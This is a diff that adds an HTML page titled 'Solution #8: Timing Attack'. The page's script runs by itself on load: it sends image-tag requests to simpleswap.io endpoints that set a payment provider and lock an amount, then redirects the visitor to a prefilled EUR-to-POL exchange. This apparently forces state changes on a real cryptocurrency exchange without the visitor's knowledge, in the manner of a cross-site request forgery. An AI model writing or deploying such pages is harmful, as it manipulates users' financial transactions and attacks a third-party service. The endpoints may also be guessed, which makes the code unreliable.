@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solution #8: Timing Attack</title>
+</head>
+<body>
+    <script>
+    // Solution 8: Exploit timing - send requests in specific order
+    async function timingAttack() {
+        // First, establish provider preference
+        const img1 = new Image();
+        img1.src = 'https://simpleswap.io/api/set-provider?provider=mercuryo&priority=1';
+        
+        // Wait a bit
+        await new Promise(r => setTimeout(r, 100));
+        
+        // Then set amount preference
+        const img2 = new Image();
+        img2.src = 'https://simpleswap.io/api/lock-amount?amount=19.50&currency=eur';
+        
+        // Wait again
+        await new Promise(r => setTimeout(r, 100));
+        
+        // Finally redirect
+        window.location.href = 'https://simpleswap.io/exchange?from=eur&to=pol&amount=19.50&preloaded=1';
+    }
+    
+    timingAttack();
+    </script>
+</body>
+</html>
